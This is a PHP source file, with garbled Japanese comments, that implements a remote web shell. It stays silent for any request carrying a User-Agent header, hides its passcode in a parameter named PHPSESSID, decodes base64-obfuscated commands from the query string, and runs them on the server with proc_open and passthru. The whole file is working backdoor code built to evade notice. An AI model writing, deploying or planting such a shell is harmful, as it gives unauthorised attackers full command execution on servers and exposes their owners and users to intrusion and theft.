<?php
// *** �����Ƀp�X�R�[�h��ݒ肷�� ***
    define('PASS_CODE', '');
// *** �����Ƀp�X�R�[�h��ݒ肷�� ***

    // ����ݒ�
    mb_language('Japanese');

    // ���[�U�[�G�[�W�F���g�`�F�b�N
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        return;
    }

    if (PASS_CODE != '' && PASS_CODE != $_GET['PHPSESSID']) {
        return;
    }

    // �Z�b�V�����X�^�[�g
    session_start();

    // �Z�b�V�����`�F�b�N
    if (!isset($_SESSION['SESSION'])) {
        $_SESSION['SESSION'] = 'on';
        $_SESSION['path'] = getcwd();
        return;
    } elseif (isset($_SESSION['path'])) {
        $path = $_SESSION['path'];
        @chdir($path);
    } else {
        $path = getcwd();
    }

    // �f�[�^������ꍇ
    if (isset($_GET['cmd'])) {
        $command = str_replace('$', "\n", $_GET['cmd']);
        $command = str_replace('#', '+', $command);
        $command = str_replace('%', '/', $command);
        $command = base64_decode($command);
    } else {
        return;
    }

    // cd�R�}���h�̏ꍇ�f�B���N�g�����o��
    if (substr(trim($command), 0, 3) == 'cd ') {
        $temp = trim(substr($command, 3), " \t\n\r");
        // Windows�̏ꍇ
        if (PHP_OS == 'WIN32' || PHP_OS == 'WINNT') {
            // ��΁E���΂𔻕�
            if (substr($temp, 1, 1) == ':') {
                @chdir($temp);
            } else {
                @chdir($path . DIRECTORY_SEPARATOR . $temp);
            }
            $_SESSION['path'] = getcwd();
            passthru('cd');
        } else {
            // ��΁E���΂𔻕�
            if (substr($temp, 0, 1) == DIRECTORY_SEPARATOR) {
                @chdir($temp);
            } else {
                @chdir($path . DIRECTORY_SEPARATOR . $temp);
            }
            $_SESSION['path'] = getcwd();
            passthru('pwd');
        }
    } else {
        // �v���Z�X�I�[�v��
        $process = proc_open($command, array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
            ), $pipes, $path);

        // �v���Z�X�N�����s
        if (!$process) {
            return;
        }

        // �R�}���h����
        $temp = explode("\n", $command);
        for ($i = 1; $i < count($temp); $i++){
            fwrite($pipes[0], $temp[$i]);
        }
        fclose($pipes[0]);

        // �ł܂�̖h�~
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        set_time_limit(60);

        // �p�C�v���ǂݏo���\�Ȋ�
        while (!feof($pipes[1]) || !feof($pipes[2])) {

            $in = array($pipes[1], $pipes[2]);
            $ex = $out = null;
            $result = stream_select($in, $out, $ex, 5);

            // �ُ�E�^�C���A�E�g�����ꍇ
            if ($result === false || $result === 0) {
                proc_terminate($process);
                die('�R�}���h���^�C���A�E�g���܂����B');
                break;
            } elseif ($result > 0) {
                // �f�[�^�ǂݏo��
                foreach ($in as $temp) {
                    while (!feof($temp)) {
                        print mb_convert_encoding(fgets($temp), 'SJIS', 'auto');
                    }
                }
            }
        }

        // �v���Z�X�N���[�Y
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
?>
